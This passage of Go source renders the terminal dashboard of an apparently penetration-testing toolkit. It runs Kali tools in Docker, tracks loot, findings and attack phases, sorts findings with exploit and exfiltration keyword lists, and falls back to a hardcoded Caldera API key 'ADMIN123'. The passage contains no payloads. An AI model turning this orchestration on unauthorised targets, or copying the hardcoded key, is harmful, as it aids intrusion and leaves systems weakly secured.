		selectedCommand = kaliExecCommand(selected.KaliShell)
	}
	lines = append(lines,
		metricLine("selected option", selected.Label),
		metricLine("description", truncate(selected.Description, max(24, width-16))),
		metricLine("command", truncate(selectedCommand, max(24, width-12))),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("available options"),
	)
	snap := deriveChainSnapshot(m.commands, m.findings, m.loot)
	doneCache := map[string]bool{}
	for i, action := range actions {
		prefix := "  "
		if i == m.activeControlIndex() {
			prefix = "▸ "
		}
		label := truncate(m.controlActionTaggedLabel(action, snap, m.commands, doneCache), max(16, width-6))
		lines = append(lines, prefix+styleControlOptionTags(label))
	}
	return strings.Join(lines, "\n")
}

func (m model) controlActionTaggedLabel(action controlAction, snap chainSnapshot, commands []commandEntry, doneCache map[string]bool) string {
	tags := []string{}
	switch strings.ToLower(strings.TrimSpace(action.Mode)) {
	case "kali":
		tags = append(tags, "KALI")
	case "local":
		tags = append(tags, "LOCAL")
	case "internal":
		tags = append(tags, "MENU")
	}
	if done := actionDoneCached(action, commands, doneCache); done {
		tags = append(tags, "DONE")
	} else if ok, _ := requirementsReady(action.Requires, snap); !ok {
		tags = append(tags, "LOCKED")
	} else if strings.EqualFold(strings.TrimSpace(action.Mode), "kali") {
		if ok, _ := m.kaliPreflight(action); !ok {
			tags = append(tags, "LOCKED")
		} else {
			tags = append(tags, "READY")
		}
	} else if !strings.EqualFold(strings.TrimSpace(action.Mode), "internal") {
		tags = append(tags, "READY")
	}
	if len(tags) == 0 {
		return action.Label
	}
	parts := make([]string, 0, len(tags)+1)
	for _, tag := range tags {
		parts = append(parts, "["+tag+"]")
	}
	parts = append(parts, action.Label)
	return strings.Join(parts, " ")
}

func actionDoneCached(action controlAction, commands []commandEntry, doneCache map[string]bool) bool {
	needle := strings.ToLower(strings.TrimSpace(action.ActionID))
	if needle == "" {
		return false
	}
	if done, ok := doneCache[needle]; ok {
		return done
	}
	done := actionDone(action, commands)
	doneCache[needle] = done
	return done
}

func styleControlOptionTags(label string) string {
	out := label
	replacements := []struct {
		token string
		style lipgloss.Style
	}{
		{"[DONE]", lipgloss.NewStyle().Foreground(lipgloss.Color("42")).Bold(true)},
		{"[READY]", lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Bold(true)},
		{"[LOCKED]", lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)},
		{"[WARN]", lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)},
		{"[KALI]", lipgloss.NewStyle().Foreground(lipgloss.Color("220"))},
		{"[LOCAL]", lipgloss.NewStyle().Foreground(lipgloss.Color("214"))},
		{"[MENU]", lipgloss.NewStyle().Foreground(lipgloss.Color("245"))},
	}
	for _, item := range replacements {
		out = strings.ReplaceAll(out, item.token, item.style.Render(item.token))
	}
	return out
}

func (m model) controlModeContextLines(mode, selectedTask string, onchainProfile onchainNetworkProfile) []string {
	customMode := strings.ToUpper(m.activeCustomRuntime())
	customCommand := truncate(valueOr(m.activeCustomCommand(mode), "unset"), 54)
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		return []string{
			metricLine("seed input", valueOr(m.osintTargetInput, "example.com")),
			metricLine("seed type", strings.ToUpper(m.selectedOsintInputType())),
			metricLine("deep engine", strings.ToUpper(m.selectedOsintDeepEngine())),
			metricLine("custom rt", customMode),
			metricLine("custom cmd", customCommand),
		}
	case "onchain":
		return []string{
			metricLine("target input", valueOr(m.onchainTargetInput, "0x...")),
			metricLine("input type", strings.ToUpper(m.selectedOnchainInputType())),
			metricLine("network", onchainProfile.Label+" ("+onchainProfile.Key+")"),
			metricLine("chain id", fmt.Sprintf("%d", onchainProfile.ChainID)),
			metricLine("rpc", onchainRPCHost(onchainProfile.RPCURL)),
			metricLine("custom rt", customMode),
			metricLine("custom cmd", customCommand),
		}
	default:
		return []string{
			metricLine("selected cve", selectedTask),
			metricLine("pipeline", selectedPipelineLabel(m.selectedPipelineName())),
			metricLine("fire group", strings.ToUpper(m.selectedExploitFireGroup())),
			metricLine("fire target", truncate(m.effectiveExploitTargetURL(), 54)),
			metricLine("brute source", strings.ToUpper(m.selectedBruteCredentialSource())),
			metricLine("brute auth", strings.ToUpper(m.selectedBruteAuthMode())),
			metricLine("manual input", valueOr(m.manualTargetInput, defaultTargetSuggestion()+" (suggested)")),
			metricLine("custom rt", customMode),
			metricLine("custom cmd", customCommand),
		}
	}
}

func (m model) footerView() string {
	return lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Padding(0, 1).Render(m.help.View(m.keys))
}

func pane(title, body string, width, height int) string {
	return lipgloss.NewStyle().
		Width(width).
		Height(height).
		MaxWidth(width).
		MaxHeight(height).
		Border(lipgloss.RoundedBorder()).
		BorderForeground(lipgloss.Color("62")).
		Padding(0, 1).
		Render(lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Bold(true).Render(title) + "\n" + body)
}

func paneScrolled(title, body string, width, height, offset int) string {
	innerHeight := max(3, height-4)
	clipped, marker := clipBody(body, innerHeight, offset)
	if marker != "" {
		clipped += "\n" + lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(marker)
	}
	return pane(title, clipped, width, height)
}

func badgePill(text, bg, fg string) string {
	return lipgloss.NewStyle().Foreground(lipgloss.Color(fg)).Background(lipgloss.Color(bg)).Bold(true).Padding(0, 1).Render(text)
}

func metricLine(label, value string) string {
	return lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(label+": ") +
		lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Render(value)
}

func severityBadge(severity string) string {
	switch strings.ToLower(strings.TrimSpace(severity)) {
	case "critical":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("CRITICAL")
	case "high":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("214")).Bold(true).Padding(0, 1).Render("HIGH")
	case "medium":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("111")).Bold(true).Padding(0, 1).Render("MEDIUM")
	case "low":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("151")).Bold(true).Padding(0, 1).Render("LOW")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("245")).Bold(true).Padding(0, 1).Render(strings.ToUpper(valueOr(severity, "info")))
	}
}

func statusBadge(status string) string {
	switch strings.ToLower(strings.TrimSpace(status)) {
	case "success", "done", "ok", "complete", "completed":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("84")).Bold(true).Padding(0, 1).Render("DONE")
	case "running", "start", "started":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("117")).Bold(true).Padding(0, 1).Render("RUN")
	case "error", "failed", "fail":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("FAIL")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("245")).Bold(true).Padding(0, 1).Render(strings.ToUpper(valueOr(status, "idle")))
	}
}

func kindBadge(kind string) string {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "credential", "jwt", "token":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("161")).Bold(true).Padding(0, 1).Render("AUTH")
	case "flag":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("220")).Bold(true).Padding(0, 1).Render("FLAG")
	case "endpoint", "path":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("117")).Bold(true).Padding(0, 1).Render("PATH")
	case "vuln":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("VULN")
	case "artifact":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("244")).Bold(true).Padding(0, 1).Render("ART")
	case "file", "document", "backup":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("186")).Bold(true).Padding(0, 1).Render("FILE")
	case "hash", "password":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("90")).Bold(true).Padding(0, 1).Render("HASH")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("245")).Bold(true).Padding(0, 1).Render("LOOT")
	}
}

func valueOr(v, fallback string) string {
	if strings.TrimSpace(v) == "" {
		return fallback
	}
	return v
}

func defaultTargetSuggestion() string {
	return "http://127.0.0.1"
}

func kaliContainerName() string {
	value := strings.TrimSpace(os.Getenv("H3RETIK_KALI_CONTAINER"))
	if value == "" {
		return "h3retik-kali"
	}
	return value
}

func kaliImageName() string {
	value := strings.TrimSpace(os.Getenv("H3RETIK_KALI_IMAGE"))
	if value == "" {
		return "h3retik/kali:v0.0.3"
	}
	return value
}

func kaliExecCommand(shell string) string {
	return "docker exec " + kaliContainerName() + " bash -lc " + shellQuote(shell)
}

func clearKaliToolCache(container string) {
	needle := strings.TrimSpace(container)
	if needle == "" {
		return
	}
	kaliToolCacheMu.Lock()
	defer kaliToolCacheMu.Unlock()
	for key := range kaliToolCache {
		if strings.HasPrefix(key, needle+"::") {
			delete(kaliToolCache, key)
		}
	}
}

func kaliToolCacheKey(container, tool string) string {
	return strings.TrimSpace(container) + "::" + strings.TrimSpace(strings.ToLower(tool))
}

func firstShellCommandToken(shell string) string {
	trimmed := strings.TrimSpace(shell)
	if trimmed == "" {
		return ""
	}
	separators := []string{"&&", "||", ";", "\n", "|"}
	for _, sep := range separators {
		if idx := strings.Index(trimmed, sep); idx >= 0 {
			trimmed = strings.TrimSpace(trimmed[:idx])
		}
	}
	if trimmed == "" {
		return ""
	}
	for _, token := range strings.Fields(trimmed) {
		clean := strings.Trim(strings.TrimSpace(token), `"'`)
		if clean == "" {
			continue
		}
		if strings.Contains(clean, "=") {
			parts := strings.SplitN(clean, "=", 2)
			if len(parts) == 2 {
				name := strings.TrimSpace(parts[0])
				if matched, _ := regexp.MatchString(`^[A-Za-z_][A-Za-z0-9_]*$`, name); matched {
					continue
				}
			}
		}
		if strings.HasPrefix(clean, "$") {
			continue
		}
		return clean
	}
	return ""
}

func kaliToolAvailableCached(container, tool string) (bool, error) {
	container = strings.TrimSpace(container)
	tool = strings.TrimSpace(strings.ToLower(tool))
	if container == "" || tool == "" {
		return true, nil
	}
	key := kaliToolCacheKey(container, tool)
	kaliToolCacheMu.Lock()
	if hit, ok := kaliToolCache[key]; ok {
		kaliToolCacheMu.Unlock()
		return hit, nil
	}
	kaliToolCacheMu.Unlock()

	check := exec.Command("docker", "exec", container, "bash", "-lc", "command -v "+shellQuote(tool)+" >/dev/null 2>&1")
	err := check.Run()
	available := err == nil
	kaliToolCacheMu.Lock()
	kaliToolCache[key] = available
	kaliToolCacheMu.Unlock()
	if err != nil {
		return false, nil
	}
	return true, nil
}

func kaliRuntimeRunningCached(container string) bool {
	container = strings.TrimSpace(container)
	if container == "" {
		return false
	}
	now := time.Now()
	kaliStateMu.Lock()
	if state, ok := kaliStateCache[container]; ok && now.Sub(state.Checked) < 2*time.Second {
		kaliStateMu.Unlock()
		return state.Running
	}
	kaliStateMu.Unlock()
	check := exec.Command("docker", "inspect", "-f", "{{.State.Running}}", container)
	out, err := check.CombinedOutput()
	running := err == nil && strings.Contains(strings.ToLower(strings.TrimSpace(string(out))), "true")
	kaliStateMu.Lock()
	kaliStateCache[container] = kaliRuntimeState{Running: running, Checked: now}
	kaliStateMu.Unlock()
	return running
}

func defaultCoopCalderaURL() string {
	value := strings.TrimSpace(os.Getenv("COOP_CALDERA_URL"))
	if value == "" {
		return "http://127.0.0.1:8888"
	}
	return value
}

func defaultCoopCalderaAPIKey() string {
	value := strings.TrimSpace(os.Getenv("COOP_CALDERA_API_KEY"))
	if value == "" {
		return "ADMIN123"
	}
	return value
}

func shortTime(v string) string {
	if v == "" {
		return "-"
	}
	t, err := time.Parse(time.RFC3339, v)
	if err != nil {
		return truncate(v, 19)
	}
	return t.Local().Format("15:04:05")
}

func renderServices(services []serviceEntry) string {
	if len(services) == 0 {
		return "no docker services discovered"
	}
	lines := make([]string, 0, len(services))
	for _, svc := range services {
		lines = append(lines, fmt.Sprintf("[svc] %s  %s  %s", svc.Name, statusBadge(svc.Status), svc.Ports))
	}
	return strings.Join(lines, "\n")
}

func latestActivity(commands []commandEntry, findings []findingEntry, loot []lootEntry) string {
	lines := []string{}
	for i, c := range commands {
		if i >= 5 {
			break
		}
		lines = append(lines, fmt.Sprintf("[%s] %s %s :: %s", shortTime(c.Timestamp), statusBadge(c.Status), c.Tool, truncate(c.Command, 64)))
	}
	if len(findings) > 0 {
		lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("latest finding"))
		lines = append(lines, truncate(severityBadge(findings[0].Severity)+" "+findings[0].Title, 80))
	}
	if len(loot) > 0 {
		lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("latest loot"))
		lines = append(lines, truncate(loot[0].Name+" from "+loot[0].Source, 80))
	}
	if len(lines) == 0 {
		return "No activity yet."
	}
	return strings.Join(lines, "\n")
}

func attackTimelinePanel(commands []commandEntry, selected, width int) string {
	if len(commands) == 0 {
		return "no events recorded"
	}
	lines := []string{}
	start := max(0, selected-4)
	end := minInt(len(commands), start+8)
	if end-start < 8 {
		start = max(0, end-8)
	}
	for i := start; i < end; i++ {
		cmd := commands[i]
		dot := "o"
		connector := "|"
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		if i == selected {
			dot = "@"
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Bold(true)
		}
		if i == end-1 {
			connector = " "
		}
		label := fmt.Sprintf("%s-%s %s %s", shortTime(cmd.Timestamp), truncate(cmd.Phase, 8), truncate(cmd.Tool, 8), truncate(cmd.Status, 7))
		lines = append(lines, style.Render(fmt.Sprintf("%s-- %s", dot, truncate(label, width-4))))
		if connector != " " {
			lines = append(lines, style.Render(connector))
		}
	}
	lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("select event with ↑/↓, replay with x"))
	return strings.Join(lines, "\n")
}

func loadingPanel(label string, frame splashFrame, width int) string {
	frameLabel := lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(label)
	art := lipgloss.NewStyle().Foreground(lipgloss.Color("99")).Render(frame.Art)
	meta := lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(truncate(frame.Title, width-4))
	return strings.Join([]string{frameLabel, "", art, "", meta}, "\n")
}

func toolHeatmap(commands []commandEntry, width int) string {
	type stats struct {
		total int
		ok    int
		fail  int
	}
	if len(commands) == 0 {
		return "no kali tool telemetry yet"
	}
	ordered := []string{}
	byTool := map[string]*stats{}
	for i := len(commands) - 1; i >= 0; i-- {
		cmd := commands[i]
		tool := strings.TrimSpace(cmd.Tool)
		if tool == "" {
			tool = "unknown"
		}
		if byTool[tool] == nil {
			ordered = append(ordered, tool)
			byTool[tool] = &stats{}
		}
		byTool[tool].total++
		if isSuccessStatus(cmd.Status, cmd.ExitCode) {
			byTool[tool].ok++
		} else if isFailureStatus(cmd.Status, cmd.ExitCode) {
			byTool[tool].fail++
		}
	}
	lines := []string{}
	for i, tool := range ordered {
		if i >= 6 {
			break
		}
		s := byTool[tool]
		lines = append(lines, fmt.Sprintf("%-10s %s %s x%d", truncate(tool, 10), miniMeter(s.ok, s.fail), successFailBadge(s.ok, s.fail), s.total))
	}
	return strings.Join(lines, "\n")
}

func endpointMap(findings []findingEntry, loot []lootEntry, width int) string {
	type endpointState struct {
		label  string
		status string
	}
	byEndpoint := map[string]endpointState{}
	add := func(endpoint, label, status string) {
		if strings.TrimSpace(endpoint) == "" {
			return
		}
		current, ok := byEndpoint[endpoint]
		if !ok || endpointPriority(status) > endpointPriority(current.status) {
			byEndpoint[endpoint] = endpointState{label: label, status: status}
		}
	}
	for _, f := range findings {
		label := "SEEN"
		if strings.Contains(strings.ToLower(f.Impact), "exfil") || strings.Contains(strings.ToLower(f.Impact), "compromise") {
			label = "ABUSED"
		}
		add(f.Endpoint, classifyEndpoint(f.Endpoint), label)
	}
	for _, item := range loot {
		add(item.Source, classifyEndpoint(item.Source), "EXFIL")
	}
	if len(byEndpoint) == 0 {
		return "no endpoints inferred yet"
	}
	keys := make([]string, 0, len(byEndpoint))
	for k := range byEndpoint {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	lines := []string{}
	for i, k := range keys {
		if i >= 8 {
			break
		}
		v := byEndpoint[k]
		lines = append(lines, fmt.Sprintf("%s %s %s", endpointBadge(v.status), typeBadge(v.label), truncate(k, max(18, width-16))))
	}
	return strings.Join(lines, "\n")
}

func renderOSINTTaxonomyMap(selectedKey string) string {
	art := strings.TrimPrefix(osintNavigatorASCII, "\n")
	for _, point := range osintTaxonomyPoints {
		styled := plainLabelWithState(point.Marker, "", strings.EqualFold(point.Key, selectedKey))
		art = strings.Replace(art, point.Token, styled, 1)
	}
	menu := make([]string, 0, len(osintTaxonomyPoints))
	for i, point := range osintTaxonomyPoints {
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		if strings.EqualFold(point.Key, selectedKey) {
			prefix = "▸ "
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
		}
		menu = append(menu, style.Render(fmt.Sprintf("%s%02d %s :: %s", prefix, i+1, strings.ToUpper(point.Marker), point.Phase)))
	}
	return strings.Join(menu, "\n") + "\n\n" + art
}

func osintDataLocations(root string, limit int) []string {
	if limit <= 0 {
		limit = 10
	}
	lines := []string{
		"telemetry findings :: telemetry/findings.jsonl",
		"telemetry loot :: telemetry/loot.jsonl",
		"osint artifacts dir :: artifacts/osint/",
		"spiderfoot runtime :: /opt/spiderfoot + /opt/spiderfoot-venv (inside kali)",
		"recon-ng workspace :: ~/.recon-ng/workspaces/osint (inside kali)",
		"rengine scaffold :: /opt/rengine + /opt/rengine-venv (inside kali)",
	}
	artifactRoot := filepath.Join(root, "artifacts", "osint")
	found := 0
	_ = filepath.WalkDir(artifactRoot, func(path string, d os.DirEntry, err error) error {
		if err != nil || d == nil || d.IsDir() {
			return nil
		}
		if found >= limit {
			return filepath.SkipDir
		}
		rel, relErr := filepath.Rel(root, path)
		if relErr != nil {
			rel = path
		}
		lines = append(lines, "artifact :: "+rel)
		found++
		return nil
	})
	return lines
}

func osintPointWorkflow(point osintTaxonomyPoint, targetURL, deepEngine string) []string {
	base := strings.TrimSpace(targetURL)
	seed := targetHostFromURL(base)
	if seed == "" {
		seed = "example.com"
	}
	switch point.Key {
	case "seed_media_buffer", "function_key":
		return []string{
			"Define seed + context (person/domain/email/username/ip).",
			"Run CTRL->FIRE->OSINT `[OSINT] Seed Harvest`.",
			"Capture first-hop entities into loot and artifacts.",
		}
	case "input_channel", "normal_flow":
		return []string{
			"Expand from seed to linked entities/infrastructure.",
			"Use deep automation with selected engine `" + strings.ToUpper(deepEngine) + "`.",
			"Track source lineage before collection escalation.",
		}
	case "collection_app", "peripherals":
		return []string{
			"Run recon-ng module chain for passive pull.",
			"Run reNgine status/API checks for deep web dive readiness.",
			"Keep passive/active collection boundaries explicit.",
		}
	case "main_storage", "overflow_guard", "debug_tool":
		return []string{
			"Normalize + dedupe artifacts under `artifacts/osint`.",
			"Replay failed module commands and close missing prerequisites.",
			"Use `osint-stack-check` for guardrail verification.",
		}
	case "cpu_core", "output_bus":
		return []string{
			"Correlate normalized entities into graph-ready views (Neo4j/Python).",
			"Score leads by confidence, impact, and source diversity.",
			"Export concise brief + reproducible command evidence.",
		}
	case "analyst_interface", "backup_path":
		return []string{
			"Cross-check claims across independent sources.",
			"Snapshot telemetry/evidence before publishing conclusions.",
			"Attach unresolved gaps in final action brief.",
		}
	default:
		return []string{"Use CTRL FIRE OSINT actions for execution; this panel is analysis-only."}
	}
}

func osintTaxonomyEntities(point osintTaxonomyPoint, commands []commandEntry, findings []findingEntry, loot []lootEntry) []taxonomyEntity {
	out := []taxonomyEntity{}
	add := func(kind, label, detail string) {
		out = append(out, taxonomyEntity{Kind: kind, Label: label, Detail: detail})
	}
	matchAny := func(text string, needles ...string) bool {
		lower := strings.ToLower(text)
		for _, needle := range needles {
			if strings.Contains(lower, needle) {
				return true
			}
		}
		return false
	}
	for _, cmd := range commands {
		line := strings.ToLower(cmd.Command + " " + cmd.Tool)
		switch point.Key {
		case "seed_media_buffer", "function_key":
			if matchAny(line, "osint-seed-harvest", "theharvester") {
				add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
			}
		case "input_channel", "normal_flow":
			if matchAny(line, "osint-deep-bbot", "osint-deep-spiderfoot", "bbot", "spiderfoot") {
				add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
			}
		case "collection_app", "peripherals":
			if matchAny(line, "osint-reconng", "recon-ng", "osint-rengine", "rengine") {
				add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
			}
		case "main_storage":
			if matchAny(line, "find /artifacts/osint", "artifact index", "osint-stack-check") {
				add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
			}
		case "cpu_core", "output_bus":
			if matchAny(line, "telemetryctl.py show", "telemetryctl.py snapshot") {
				add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
			}
		case "overflow_guard", "debug_tool", "analyst_interface", "backup_path":
			if matchAny(line, "osint-stack-check", "snapshot", "replay", "show --run latest") {
				add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
			}
		}
	}
	for _, item := range loot {
		meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
		switch point.Key {
		case "seed_media_buffer", "function_key":
			if matchAny(meta, "seed", "domain", "email", "username", "phone", "ip") {
				add(item.Kind, item.Name, item.Source)
			}
		case "collection_app", "peripherals", "main_storage":
			if matchAny(meta, "artifacts/osint", "osint", "scan", "subdomain", "whois", "dns") {
				add(item.Kind, item.Name, item.Source)
			}
		case "cpu_core", "output_bus", "backup_path":
			if matchAny(meta, "report", "graph", "json", "snapshot") {
				add(item.Kind, item.Name, item.Source)
			}
		}
	}
	for _, f := range findings {
		meta := strings.ToLower(f.Title + " " + f.Endpoint + " " + f.Evidence + " " + f.Impact)
		switch point.Key {
		case "input_channel", "normal_flow":
			if matchAny(meta, "discovery", "enumeration", "surface", "intel") {
				add("finding", f.Title, f.Endpoint+" :: "+f.Impact)
			}
		case "overflow_guard", "debug_tool":
			if matchAny(meta, "timeout", "failed", "missing", "unavailable", "error") {
				add("finding", f.Title, f.Endpoint+" :: "+f.Evidence)
			}
		case "analyst_interface", "cpu_core", "output_bus":
			if matchAny(meta, "validation", "correlat", "risk", "report", "confidence") {
				add("finding", f.Title, f.Endpoint+" :: "+f.Impact)
			}
		}
	}
	return dedupeTaxonomyEntities(out)
}

func renderTaxonomySkull(macro, sub, severity string, subMode bool) string {
	lines := strings.Split(strings.TrimPrefix(skullTaxonomyASCII, "\n"), "\n")
	if len(lines) < 23 {
		return skullTaxonomyASCII
	}

	lines[3] = replacePrefix(lines[3], 14, plainFixedLabelWithState("DISCOVER", 14, severity, macro == "DISCOVER" && !subMode))
	lines[4] = replacePrefix(lines[4], 14, strings.Repeat(" ", 14))

	lines[10] = replacePrefix(lines[10], 13, strings.Repeat(" ", 13))
	lines[11] = replacePrefix(lines[11], 13, plainFixedLabelWithState("BREACH", 13, severity, macro == "BREACH" && !subMode))
	lines[12] = replacePrefix(lines[12], 13, strings.Repeat(" ", 13))
	lines[13] = replacePrefix(lines[13], 13, strings.Repeat(" ", 13))

	lines[18] = replacePrefix(lines[18], 16, plainFixedLabelWithState("IMPACT", 16, severity, macro == "IMPACT" && !subMode))

	lines[3] = replaceAfterMarker(lines[3], ",--- ", plainLabelWithState("SURFACE", severity, subMode && sub == "SURFACE"))
	lines[7] = replaceAfterMarker(lines[7], "<----- ", plainLabelWithState("INTEL", severity, subMode && sub == "INTEL"))
	lines[10] = replaceAfterMarker(lines[10], "<------ ", plainLabelWithState("AUTH", severity, subMode && sub == "AUTH"))
	lines[13] = replaceAfterMarker(lines[13], "<--------- ", plainLabelWithState("ACCESS", severity, subMode && sub == "ACCESS"))
	lines[15] = replaceAfterMarker(lines[15], "<--- ", plainLabelWithState("EXFIL", severity, subMode && sub == "EXFIL"))
	lines[20] = replaceAfterMarker(lines[20], "<-x---- ", plainLabelWithState("TAMPER", severity, subMode && sub == "TAMPER"))
	lines = colorSkullHotspot(lines, sub, severity)

	return strings.Join(lines, "\n")
}

func colorSkullHotspot(lines []string, sub, severity string) []string {
	if len(lines) == 0 {
		return lines
	}
	bg, fg := taxonomySeverityPalette(severity)
	style := lipgloss.NewStyle().Foreground(lipgloss.Color(fg)).Background(lipgloss.Color(bg)).Bold(true)
	hotspots := map[string][]int{
		"SURFACE": {2, 3, 4},
		"INTEL":   {6, 7, 8},
		"AUTH":    {9, 10, 11},
		"ACCESS":  {12, 13, 14},
		"EXFIL":   {14, 15, 16},
		"TAMPER":  {19, 20, 21},
	}
	indices, ok := hotspots[strings.ToUpper(strings.TrimSpace(sub))]
	if !ok {
		return lines
	}
	for _, idx := range indices {
		if idx >= 0 && idx < len(lines) {
			lines[idx] = style.Render(lines[idx])
		}
	}
	return lines
}

func styleSkullLabel(label string, active bool) string {
	if active {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Render(label)
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Bold(true).Render(label)
}

func skullFixedLabel(label string, width int, active bool) string {
	padded := fmt.Sprintf("%-*s", width, label)
	if active {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Render(padded)
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("212")).Bold(true).Render(padded)
}

func plainFixedLabel(label string, width int) string {
	return fmt.Sprintf("%-*s", width, label)
}

func plainLabel(label string) string {
	return label
}

func plainFixedLabelWithState(label string, width int, severity string, active bool) string {
	padded := plainFixedLabel(label, width)
	if active {
		bg, fg := taxonomySeverityPalette(severity)
		return lipgloss.NewStyle().Foreground(lipgloss.Color(fg)).Background(lipgloss.Color(bg)).Bold(true).Render(padded)
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Bold(true).Render(padded)
}

func plainLabelWithState(label, severity string, active bool) string {
	if active {
		bg, fg := taxonomySeverityPalette(severity)
		return lipgloss.NewStyle().Foreground(lipgloss.Color(fg)).Background(lipgloss.Color(bg)).Bold(true).Render(label)
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Bold(true).Render(label)
}

func taxonomySeverityPalette(severity string) (string, string) {
	switch strings.ToLower(strings.TrimSpace(severity)) {
	case "critical":
		return "160", "230"
	case "high":
		return "208", "16"
	case "medium":
		return "111", "16"
	default:
		return "57", "230"
	}
}

func taxonomySelectionHint(_ bool) string {
	return "↑/↓ navigate OSINT taxonomy nodes. execution is disabled here; use CTRL -> FIRE (o OSINT, c ONCHAIN)."
}

func exploitTaxonomySelection(f findingEntry, commands []commandEntry, findings []findingEntry, loot []lootEntry) (string, string) {
	text := strings.ToLower(strings.TrimSpace(f.Title + " " + f.Evidence + " " + f.Impact + " " + f.Endpoint))
	containsAny := func(raw string, terms ...string) bool {
		for _, term := range terms {
			if strings.Contains(raw, strings.ToLower(strings.TrimSpace(term))) {
				return true
			}
		}
		return false
	}
	switch {
	case containsAny(text, "tamper", "deface", "integrity", "price", "collection", "modified", "mutated"):
		return "IMPACT", "TAMPER"
	case containsAny(text, "exfil", "ftp", "backup", "kdbx", "document", "leak", "dump", "download"):
		return "IMPACT", "EXFIL"
	case containsAny(text, "auth", "login", "jwt", "token", "credential", "session", "account takeover"):
		return "BREACH", "AUTH"
	case containsAny(text, "sql", "sqli", "rce", "command injection", "cmd_injection", "path traversal", "ssrf", "xss", "idor", "exploit"):
		return "BREACH", "ACCESS"
	case containsAny(text, "robots", "openapi", "endpoint", "directory", "surface", "enumeration", "fingerprint", "nmap", "nikto", "nuclei"):
		return "DISCOVER", "SURFACE"
	}
	s := deriveChainSnapshot(commands, findings, loot)
	if s.Tamper {
		return "IMPACT", "TAMPER"
	}
	if s.Exfil {
		return "IMPACT", "EXFIL"
	}
	if s.Breach {
		return "BREACH", "AUTH"
	}
	if s.Recon {
		return "DISCOVER", "SURFACE"
	}
	return "DISCOVER", "INTEL"
}

func exploitTaxonomyNodes() []exploitTaxonomyNode {
	return []exploitTaxonomyNode{
		{Macro: "DISCOVER", Sub: "SURFACE"},
		{Macro: "DISCOVER", Sub: "INTEL"},
		{Macro: "BREACH", Sub: "AUTH"},
		{Macro: "BREACH", Sub: "ACCESS"},
		{Macro: "IMPACT", Sub: "EXFIL"},
		{Macro: "IMPACT", Sub: "TAMPER"},
	}
}

func (m model) selectedExploitTaxonomyNode() exploitTaxonomyNode {
	nodes := exploitTaxonomyNodes()
	if len(nodes) == 0 {
		return exploitTaxonomyNode{Macro: "DISCOVER", Sub: "SURFACE"}
	}
	idx := clampWrap(m.pwnedTaxIdx, len(nodes))
	return nodes[idx]
}

func exploitSkullMapNodes() []exploitSkullMapNode {
	return []exploitSkullMapNode{
		{Zone: "EXT", ZoneLabel: "EXTERNAL SURFACE", Sub: "SURFACE", SubLabel: "RECON/FINGERPRINT", Description: "Recon + service exposure footprint and route baseline."},
